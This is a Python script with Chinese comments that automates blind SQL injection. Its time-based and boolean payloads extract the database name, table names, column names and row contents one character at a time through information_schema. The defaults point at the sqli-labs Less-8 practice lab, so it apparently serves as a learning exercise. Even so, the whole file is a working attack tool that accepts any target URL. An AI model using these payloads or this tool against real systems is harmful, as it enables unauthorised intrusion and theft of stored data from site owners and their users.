#coding:utf-8
from ast import parse
from email.policy import default
import requests
import optparse
import time

#一、定义存储数据库数据的变量和一个request对象用来进行请求
#存放数据库名的变量
DBName = ""
#存放数据库表的变量
DBTables = []
#存放数据库字段的变量
DBColumns = []
#存放数据字典的变量，键为字段名，值为字段数据列表
DBData = {}
#若页面放回为真，则会出现“You are in ...........”
flag = "You are in ..........."
#设置冲连次数以及将连接改为短连接
#防止因HTTP连接次数过多导致的Max retries exceeded with url问题
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

#二、主函数，用来调用各个函数进行自动化注入
def StartSqli(url):
    GetDBName(url)
    print("[+] 当前数据库名：{0}" . format(DBName))
    GetDBTables(url,DBName)
    print("[+] 数据库{0}的表如下：" . format(DBName))
    for item in range(len(DBTables)):
        print("(" + str(item + 1) + ")" + DBTables[item])
    tableIndex = int(input("[*] 请输入要查看的表的序号：")) - 1
    GetDBColumns(url, DBName, DBTables[tableIndex])
    while True:
        print("[+] 数据表{0}的字段如下：" . format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex = int(input("[*] 请输入要查看的字段序号（输入0退出）：")) - 1
        if(columnIndex == -1):
            break
        else:
            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])

#三、获取数据库名的函数，根据得到的URL获取数据库名并把最后的结果存入DBName
# 获取数据库名的函数
def GetDBName(url):
    # 引用全局变量DBName，用来存放网页当前使用的数据库名
    global DBName
    print("[-]开始获取数据库名的长度")
    # 保存数据库名长度的变量
    DBNameLen = 0
    # 用于检查数据库名长度的payload
    payload = "' and if(length(database())={0},sleep(5),0) %23"
    # 把URL和payload进行拼接，得到最终的请求URL
    targetUrl = url + payload
    # 用for循环来遍历请求，得到数据库名的长度
    for DBNameLen in range(1, 99):
        # 开始时间
        timeStart = time.time()
        # 开始访问
        res = conn.get(targetUrl.format(DBNameLen))
        # 结束时间
        timeEnd = time.time()
        # 判断时间差
        if timeEnd - timeStart >= 5:
            print("[+]数据库名的长度:" + str(DBNameLen))
            break
    print("[-]开始获取数据库名")
    payload = "' and if(ascii(substr(database(),{0},1))={1},sleep(5),0)%23"
    targetUrl = url + payload
    # a表示substr()函数的截取起始位置
    for a in range(1, DBNameLen+1):
        # b表示在ASCII码中33～126位可显示的字符
        for b in range(33, 127):
            timeStart = time.time()
            res = conn.get(targetUrl.format(a,b))
            timeEnd = time.time()
            if timeEnd - timeStart >= 5:
                DBName += chr(b)
                print("[-]"+ DBName)
                break

#四、获取数据库表的函数，根据获取到的URL和数据库名获取数据库中的表，并把结果以列表的形式存入DBTables
def GetDBTables(url, dbname):
    global DBTables
    # 存放数据库表数量的变量
    DBTableCount = 0
    print("[-]开始获取{0}数据库表数量:".format(dbname))
    # 获取数据库表数量的payload
    payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
    targetUrl = url + payload
    # 开始遍历获取数据库表的数量
    for DBTableCount in range(1, 99):
        res = conn.get(targetUrl.format(dbname, DBTableCount))
        if flag in res.content.decode("utf-8"):
            print("[+]{0}数据库中表的数量为:{1}".format(dbname, DBTableCount))
            break
    print("[-]开始获取{0}数据库的表".format(dbname))
    # 遍历表名时临时存放表名长度的变量
    tableLen = 0
    # a表示当前正在获取表的索引
    for a in range(0,DBTableCount):
        print("[-]正在获取第{0}个表名".format(a+1))
        # 先获取当前表名的长度
        for tableLen in range(1, 99):
            payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,0) %23"
            targetUrl = url + payload
            res = conn.get(targetUrl.format(dbname, a, tableLen))
            if flag in res.content.decode("utf-8"):
                break
        # 开始获取表名
        # 临时存放当前表名的变量
        table = ""
        # b表示当前表名猜解的位置
        for b in range(1, tableLen+1):
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,0) %23"
            targetUrl = url + payload
            # c表示在ASCII码中33～126位可显示的字符
            for c in range(33, 127):
                res = conn.get(targetUrl.format(dbname, a, b, c))
                if flag in res.content.decode("utf-8"):
                    table += chr(c)
                    print(table)
                    break
        # 把获取到的表名加入DBTables
        DBTables.append(table)
        # 清空table，用来继续获取下一个表名
        table = ""

#五、获取数据库字段的函数，根据获取的URL、数据库名和数据库表，获取表的字段并把结果以列表形式放入DBColumns
def GetDBColumns(url, dbname, dbtable):
    global DBColumns
    # 存放字段数量的变量
    DBColumnCount = 0
    print("[-]开始获取{0}数据表的字段数:".format(dbtable))
    for DBColumnCount in range(99):
        payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,0) %23"
        targetUrl = url + payload
        res = conn.get(targetUrl.format(dbname, dbtable, DBColumnCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
            break
    # 开始获取字段的名称
    # 保存字段名的临时变量
    column = ""
    # a表示当前获取字段的索引
    for a in range(0, DBColumnCount):
        print("[-]正在获取第{0}个字段名".format(a+1))
        # 先获取字段的长度
        for columnLen in range(99):
            payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},1,0) %23"
            targetUrl = url + payload
            res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
            if flag in res.content.decode("utf-8"):
                break
        # b表示当前字段名猜解的位置
        for b in range(1, columnLen+1):
            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},1,0) %23"
            targetUrl = url + payload
            # c表示在ASCII码中33～126位可显示的字符
            for c in range(33, 127):
                res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
                if flag in res.content.decode("utf-8"):
                    column += chr(c)
                    print(column)
                    break
        # 把获取到的字段名加入DBColumns
        DBColumns.append(column)
        # 清空column，用来继续获取下一个字段名
        column = ""

#六、获取表数据的函数，根据获取的URL、数据库表名、数据表字段来获取数据，数据以字典形式存放
def GetDBData(url,dbtable,dbcolumn):
    global DBData
    # 先获取字段的数据数量
    DBDataCount = 0
    print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
    for DBDataCount in range(99):
        payload = "'and if ((select count({0}) from {1})={2},1,0)  %23"
        targetUrl = url + payload
        res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, 
                DBDataCount))
            break
    for a in range(0, DBDataCount):
        print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a+1))
        # 先获取这个数据的长度
        dataLen = 0
        for dataLen in range(99):
            payload = "'and if ((select length({0}) from {1} limit {2},1)={3},1,0)  %23"
            targetUrl = url + payload
            res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
            if flag in res.content.decode("utf-8"):
                print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
                break
        # 临时存放数据内容变量
        data = ""
        # 开始获取数据的具体内容
        # b表示当前数据内容猜解的位置
        for b in range(1, dataLen+1):
            for c in range(33, 127):
                payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},1,0)  %23"
                targetUrl = url + payload
                res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
                if flag in res.content.decode("utf-8"):
                    data += chr(c)
                    print(data)
                    break
        # 放到以字段名为键，值为列表的字典中
        DBData.setdefault(dbcolumn,[]).append(data)
        print(DBData)
        # 把data清空，继续获取下一个数据
        data = ""

#七、主函数
if __name__ == '__main__':
    parser = optparse.OptionParser('usage:python %prog -u url \n\n' 'Example: python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
    #目标URL参数-u
    parser.add_option('-u', '--url', dest='targetURL', default='http://127.0.0.1/sql/Less-8/?id=1', type='string', help='target URL')
    (options, args) = parser.parse_args()
    StartSqli(options.targetURL)
